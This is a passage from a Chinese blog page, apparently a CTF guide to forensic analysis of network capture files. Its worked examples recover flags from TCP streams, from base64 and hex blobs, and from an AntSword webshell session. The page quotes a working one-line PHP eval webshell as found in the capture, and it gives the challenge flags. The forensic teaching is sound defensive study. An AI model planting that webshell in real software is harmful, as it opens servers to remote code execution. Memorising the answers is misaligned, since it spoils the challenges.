+<li>覆盖 5 类提取规则：data URI、具名参数（<code>z2=xxxx</code>）、连续 hex、连续 base64、含折行的 base64</li>
+</ul>
+<blockquote>
+<p>实战：这道题的 <code>z2</code>（204452 个 hex 字符）→ 脚本直接还原出 102226 字节的 <code>6666.jpg</code>。手工复制那串字符是灾难，<strong>这类题目一律用脚本</strong>。</p>
+</blockquote>
+<h3 id="easycappcap">例：easycap.pcap（代理端口逐字符）</h3>
+<ul>
+<li>82 帧，<strong>只有一条 TCP 流</strong>（<code>172.31.98.199 → 192.155.81.86:7890</code>）</li>
+<li>每个包只带 1 字节，Follow 后拼出 <code>FLAG:3185b87afc86711dee0175502190d116a8071</code></li>
+<li>结论：flag 被拆成 80+ 个单字符包，Follow 流即还原</li>
+</ul>
+<h3 id="1pcapngwebshell">例：数据包1.pcapng（WebShell 操作流量）</h3>
+<ul>
+<li>大量 <code>POST /index.php?user-app-register</code>，每条是一次独立操作（80+ 条流）</li>
+<li>响应 cookie <code>exam_currentuser</code> 是多次编码的数据，需逐层 URL 解码</li>
+<li>教训：先看 <code>io,phs</code> 协议统计，别一开始就 Follow 每条流</li>
+</ul>
+<h3 id="fenxiphp-base64">例：fenxi.php（导出文件伪装成 base64 图片）</h3>
+<ul>
+<li>从流量里导出 <code>fenxi.php</code>，打开发现全是 base64 文本，开头 <code>/9j/4AAQSkZJRg</code></li>
+<li><code>/9j/4</code> 是 JPEG 魔数 <code>FF D8 FF E0</code> 的 base64 → 文件根本不是 PHP，是<strong>伪装成 php 的 base64 图片</strong></li>
+<li>解码得一张图，图上直接写着 flag：<code>flag{209acebf6324a09671abc31c869de72c}</code></li>
+</ul>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code><span class="n">py</span> <span class="n">-c</span> <span class="s2">"import base64; open('out.jpg','wb').write(base64.b64decode(open('fenxi.php','rb').read()))"</span>
+</code></pre></div></div>
+
+<ul>
+<li>教训：导出文件先验真类型（魔数/是否纯 base64），别被扩展名带偏。</li>
+</ul>
+<h3 id="666666pcapng-webshell">例：666666.pcapng（蚁剑 webshell，完整链路）</h3>
+<p><strong>题目</strong>：给一个 pcapng，问 flag。</p>
+<p><strong>协议概览</strong>：2139 包，<code>tcp</code> 为主，<code>http</code> 48 帧。两条主线——</p>
+<ul>
+<li><code>192.168.25.128 ↔ 192.168.43.83:80</code>：<strong>攻击流量</strong>（蚁剑），8 个请求</li>
+<li><code>192.168.25.128 ↔ 219.216.128.25:80</code>：干扰（Kali 在 <code>apt update</code>，下 deb 包）</li>
+<li>另有 6 个 NTP 包，也是噪音</li>
+</ul>
+<p><strong>目标</strong>：Windows 10 + WAMP（<code>DESKTOP-5E59GR7</code>，<code>Apache/2.4.23 Win64 PHP/5.6.25</code>），一句话木马 <code>~/\www\upload\1.php</code>：</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span> <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nx">aa</span><span class="p">]);</span> <span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p><strong>攻击时间线</strong>：</p>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>帧号</th>
+<th>动作</th>
+<th>结果</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>178</td>
+<td>基本信息</td>
+<td>当前目录 <code>~//www/upload</code>，<strong>SYSTEM 权限</strong></td>
+</tr>
+<tr>
+<td>265</td>
+<td>列目录</td>
+<td>看到 <code>flag.txt</code>(17B)、<code>hello.zip</code>(224B)</td>
+</tr>
+<tr>
+<td>882</td>
+<td><strong>写文件</strong></td>
+<td><code>z2</code> 的 204452 个 hex 字符 → 还原成 <strong>102226 字节的 <code>6666.jpg</code></strong>（<code>ffd8ff…ffd9</code>，完整 JPEG）</td>
+</tr>
+<tr>
+<td>1269</td>
+<td>读 <code>hello.zip</code></td>
+<td>回显里是<strong>原始二进制 ZIP</strong>（<code>PK\x03\x04</code>），内含加密的 <code>flag.txt</code></td>
+</tr>
+<tr>
+<td>1719</td>
+<td>读 <code>1.php</code></td>
+<td>确认木马本体</td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>破题链</strong>：<code>6666.jpg</code> 是一张 Kali 壁纸，图上红字写着 <code>Th1s_1s_p4sswd_!!!</code> → 用它解压 <code>hello.zip</code> 里的 <code>flag.txt</code>：</p>
+<div class="code-block" data-lang="sh"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>flag{3OpWdJ-JP6FzK-koCMAK-VkfWBq-75Un2z}
+</code></pre></div></div>
+
+<p><strong>这题的两个关键点</strong>：</p>
+<ol>
+<li><strong><code>z2</code> 是纯 hex，不是 base64</strong> —— 用 <code>bytes.fromhex()</code> 还原，别把 20 万字符手工复制。</li>
+<li><strong>回显里可以是二进制</strong> —— <code>hello.zip</code> 的响应体不是文本，<code>-&gt;| ... |&lt;-</code> 之间直接是 <code>PK</code> 开头的字节。用文本方式看会全是乱码，要按二进制存。</li>
+</ol>
+<p>用脚本一条命令搞定（<code>16-流量包导出-HTTP与蚁剑webshell.py</code>）：</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>HTTP 请求 13 个，响应体 24 个，webshell 请求 8 个，还原上传文件 1 个
+</code></pre></div></div>
+
+<hr />
+<h2 id="_8">十、做题顺序总结</h2>
+<div class="code-block" data-lang="sh"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>1. io,phs 看协议分级        → 定方向（HTTP? USB? RTP? 隧道?）
+2. Ctrl+F 搜 flag / { / key  → 碰运气，10 秒
+3. 按种类翻对应章节（一~六）  → 拿针对性的过滤器和处理流程
+4. Follow 可疑流 / Export Objects → 把数据弄出来
+5. 验魔数 → 解码 → 还原格式  → 拿 flag
+</code></pre></div></div>
+
+<blockquote>
+<p>规律：流量题 = <strong>找数据 + 还原格式</strong>。难点不在工具，而在 ① 从干扰流里认出哪条有用 ② 认出数据的编码层级（可能叠好几层）。</p>
+</blockquote>
+<p><em>最后更新：2026年10月9日</em></p></div>
+      <div class="post-nav"><a class="pn-item prev" href="misc-mi-mi-wen-jian-ftp-liu-liang-ti-qu-jia-mi-rar.html"><span>← 上一篇</span><strong>Misc-秘密文件-FTP流量提取加密RAR</strong></a><a class="pn-item next" href="misc-shi-pin-yin-xie-jie-ti-bu-zhou.html"><span>下一篇 →</span><strong>Misc视频隐写解题步骤</strong></a></div>
+      <div class="post-end">
+        <a href="../posts.html">← 返回文章列表</a>
+        <a href="https://github.com/pressure-J" target="_blank" rel="noopener">在 GitHub 上找我</a>
+      </div>
+    </article>
+  </div>
+  <aside class="toc" id="toc">
+  <div class="toc-title">目录</div>
+  <nav><a href="#_1" class="toc-lv2">〇、进场四步（任何流量题都先走一遍）</a><a href="#01" class="toc-lv3">0.1 协议分级 —— 定方向</a><a href="#02" class="toc-lv3">0.2 搜关键字 —— 碰运气</a><a href="#03" class="toc-lv3">0.3 数流 —— 看有多少条会话</a><a href="#04" class="toc-lv3">0.4 分清&quot;包&quot;和&quot;流&quot;</a><a href="#05" class="toc-lv3">0.5 魔数验真类型 —— 导出文件第一件事</a><a href="#http-web" class="toc-lv2">一、HTTP / Web 明文流量</a><a href="#11-http" class="toc-lv3">1.1 普通 HTTP</a><a href="#12-armitage" class="toc-lv3">1.2 一句话木马（明文型：蚁剑 Armitage / 中国菜刀）</a><a href="#13-behinder-godzilla" class="toc-lv3">1.3 加密木马（冰蝎 Behinder / 哥斯拉 Godzilla）</a><a href="#14" class="toc-lv3">1.4 加密隧道（无回显特征）</a><a href="#15" class="toc-lv3">1.5 代理 / 一个字符一个包</a><a href="#16-http-export-objects" class="toc-lv3">1.6 HTTP 文件外带（Export Objects）</a><a href="#usb-hid" class="toc-lv2">二、USB HID 流量（超高频考点）</a><a href="#21" class="toc-lv3">2.1 三条铁律</a><a href="#22" class="toc-lv3">2.2 找设备</a><a href="#23-hid" class="toc-lv3">2.3 抽 HID 数据</a><a href="#24" class="toc-lv3">2.4 判字节布局</a><a href="#25" class="toc-lv3">2.5 键盘</a><a href="#26" class="toc-lv3">2.6 鼠标</a><a href="#27-usb" class="toc-lv3">2.7 USB 其他类型</a><a href="#rtp-voip" class="toc-lv2">三、RTP / VOIP 音频流量</a><a href="#31" class="toc-lv3">3.1 三条铁律</a><a href="#32" class="toc-lv3">3.2 确认 + 找流</a><a href="#33" class="toc-lv3">3.3 流列表 → 播放（图形化主力）</a><a href="#34-pt" class="toc-lv3">3.4 看 PT 决定走哪条路</a><a href="#35-rfc2833-dtmf" class="toc-lv3">3.5 RFC2833 DTMF 事件包（有就白送）</a><a href="#36-rtp" class="toc-lv3">3.6 RTP 包结构（定位字段用）</a><a href="#37-dtmf-101" class="toc-lv3">3.7 音频里的 DTMF（没有 101 包才需要）</a><a href="#_2" class="toc-lv2">四、隧道 / 隐蔽信道类</a><a href="#41-dns" class="toc-lv3">4.1 DNS 隧道</a><a href="#42-icmp" class="toc-lv3">4.2 ICMP 隧道</a><a href="#43" class="toc-lv3">4.3 其他隐蔽信道</a><a href="#_3" class="toc-lv2">五、加密流量</a><a href="#51-tls-https" class="toc-lv3">5.1 TLS / HTTPS 解密</a><a href="#52-wpa-wpa2" class="toc-lv3">5.2 WPA / WPA2 无线握手</a><a href="#_4" class="toc-lv2">六、文件提取（怎么把包里的文件挖出来）</a><a href="#61" class="toc-lv3">6.1 先判断：文件藏在哪种&quot;载体&quot;里</a><a href="#62-export-objects" class="toc-lv3">6.2 方法一：Export Objects（首选，但要&quot;认得出来&quot;）</a><a href="#63-gui-follow-tcp-stream" class="toc-lv3">6.3 方法二：GUI 里 Follow → TCP Stream（手把手）</a><a href="#64" class="toc-lv3">6.4 方法三：按魔数硬扫（不依赖协议解析）</a><a href="#65-kali-foremost-binwalk" class="toc-lv3">6.5 方法四：Kali 的 foremost / binwalk（题目原解常用）</a><a href="#66" class="toc-lv3">6.6 各种&quot;藏文件&quot;手法对照表</a><a href="#67" class="toc-lv3">6.7 提取 ≠ 解密</a><a href="#toolsctfmisc" class="toc-lv2">七、脚本索引（~/tools\CTF工具箱\misc\）</a><a href="#_5" class="toc-lv2">八、常见坑（汇总）</a><a href="#_6" class="toc-lv2">九、实战记录</a><a href="#_7" class="toc-lv3">通用技巧：编码数据抠图（认签名 → 解码 → 验魔数）</a><a href="#easycappcap" class="toc-lv3">例：easycap.pcap（代理端口逐字符）</a><a href="#1pcapngwebshell" class="toc-lv3">例：数据包1.pcapng（WebShell 操作流量）</a><a href="#fenxiphp-base64" class="toc-lv3">例：fenxi.php（导出文件伪装成 base64 图片）</a><a href="#666666pcapng-webshell" class="toc-lv3">例：666666.pcapng（蚁剑 webshell，完整链路）</a><a href="#_8" class="toc-lv2">十、做题顺序总结</a></nav>
+</aside>
+</main>
+<footer class="site-footer">
+  <div class="wrap footer-inner">
+    <div class="footer-col footer-about">
+      <div class="footer-brand">pressure-J<span class="brand-caret">_</span></div>
+      <p>网络安全 · 应急响应 · 流量分析<br>写能复现、能讲清楚的东西。</p>
+    </div>
+    <div class="footer-col">
+      <div class="footer-title">导航</div>
+      <a href="../index.html">首页</a>
+      <a href="../posts.html">全部文章</a>
+      <a href="../category/index.html">分类</a>
+      <a href="../about.html">关于</a>
+    </div>
+    <div class="footer-col">
+      <div class="footer-title">在别处</div>
+      <a href="https://github.com/pressure-J" target="_blank" rel="noopener">GitHub</a>
+      <a href="mailto:1489955298@qq.com">Email</a>
+      <a href="../rss.xml">RSS</a>
+    </div>
+  </div>
+  <div class="wrap footer-bottom">
+    <span>© 2026 pressure-J</span>
+    <span class="footer-build">Build 2026-10-19 · Python + Markdown</span>
+  </div>
+</footer>
+<button class="to-top" id="to-top" type="button" aria-label="回到顶部">
+  <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M12 19V5M5 12l7-7 7 7"/></svg>
+</button>
+<script src="../assets/app.js" defer></script>
+</body>
+</html>
